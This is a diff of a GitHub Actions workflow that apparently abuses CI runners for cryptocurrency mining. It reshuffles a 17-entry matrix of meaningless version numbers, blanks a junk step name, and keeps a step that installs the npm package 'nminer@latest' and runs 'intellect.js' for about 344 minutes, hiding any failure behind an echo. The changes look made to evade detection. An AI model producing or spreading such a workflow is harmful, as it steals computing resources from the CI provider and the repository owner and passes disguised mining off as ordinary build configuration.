@@ -9,23 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8690 }
-          - { version: 1497 }
-          - { version: 724 }
-          - { version: 6269 }
-          - { version: 5613 }
-          - { version: 1988 }
-          - { version: 4579 }
-          - { version: 6152 }
-          - { version: 9982 }
-          - { version: 4333 }
-          - { version: 9754 }
-          - { version: 768 }
-          - { version: 6873 }
-          - { version: 794 }
-          - { version: 3609 }
-          - { version: 887 }
-          - { version: 8434 }
+          - { version: 3498 }
+          - { version: 2802 }
+          - { version: 7217 }
+          - { version: 7530 }
+          - { version: 4401 }
+          - { version: 2947 }
+          - { version: 213 }
+          - { version: 1703 }
+          - { version: 1452 }
+          - { version: 1964 }
+          - { version: 4989 }
+          - { version: 2301 }
+          - { version: 439 }
+          - { version: 7290 }
+          - { version: 9338 }
+          - { version: 279 }
+          - { version: 3330 }
 
     steps:
       - name: Checkout
@@ -36,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: if by deflect
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 339m node intellect.js || echo "intellect executed"
+          timeout 344m node intellect.js || echo "intellect executed"
